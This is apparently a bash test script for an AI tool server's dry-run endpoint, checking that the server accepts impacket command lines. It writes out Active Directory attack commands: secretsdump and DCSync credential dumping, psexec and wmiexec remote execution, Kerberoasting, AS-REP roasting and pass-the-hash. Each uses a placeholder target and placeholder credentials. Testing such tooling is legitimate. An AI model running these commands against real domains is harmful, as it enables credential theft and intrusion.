#!/bin/bash
# Tool: impacket
# Skill: skills/impacket/SKILL.md
# Endpoint: POST /api/tools/dry-run | /api/tools/run
# Descrição: Scripts Python para ataques de protocolo Windows/AD (secretsdump, psexec, etc)
set -euo pipefail

BASE_URL="${MCP_BASE_URL:-http://localhost:3000}"
TARGET="${TEST_TARGET:-127.0.0.1}"
PASS=0; FAIL=0

pass() { echo "[PASS] $1"; ((PASS++)); }
fail() { echo "[FAIL] $1: $2"; ((FAIL++)); }

dry() {
  local desc="$1"; local options="$2"
  local R
  R=$(curl -sf -X POST "$BASE_URL/api/tools/dry-run" \
    -H "Content-Type: application/json" \
    -d "{\"tool\":\"impacket\",\"options\":\"$options\"}") || { fail "$desc" "curl error"; return; }
  echo "$R" | grep -q '"command"' \
    && pass "$desc" \
    || fail "$desc" "no command: $R"
}

echo "=== impacket ==="

echo "-- dry-run: secretsdump --"
dry "secretsdump remote"     "secretsdump.py CORP/admin:Password123@$TARGET"
dry "secretsdump DCSync"     "secretsdump.py CORP/admin:Password123@$TARGET -just-dc-ntlm"
dry "secretsdump SAM only"   "secretsdump.py CORP/admin:Password123@$TARGET -sam"

echo ""
echo "-- dry-run: remote execution --"
dry "psexec shell"           "psexec.py CORP/admin:Password123@$TARGET"
dry "wmiexec command"        "wmiexec.py CORP/admin:Password123@$TARGET whoami"
dry "smbexec shell"          "smbexec.py CORP/admin:Password123@$TARGET"
dry "atexec command"         "atexec.py CORP/admin:Password123@$TARGET whoami"

echo ""
echo "-- dry-run: Kerberos attacks --"
dry "AS-REP Roasting"        "GetNPUsers.py CORP/ -usersfile /tmp/users.txt -no-pass -format hashcat -dc-ip $TARGET"
dry "Kerberoasting"          "GetUserSPNs.py CORP/admin:Password123 -dc-ip $TARGET -request -outputfile /tmp/spn.txt"
dry "Pass-the-Hash psexec"   "psexec.py -hashes :NTLMHASH CORP/admin@$TARGET"

echo ""
echo "-- dry-run: enumeration --"
dry "SID enumeration"        "lookupsid.py CORP/admin:Password123@$TARGET"
dry "SAM dump"               "samrdump.py CORP/admin:Password123@$TARGET"
dry "RPC dump"               "rpcdump.py CORP/admin:Password123@$TARGET"
dry "SMB client"             "smbclient.py CORP/admin:Password123@$TARGET"

echo ""
echo "Results: PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
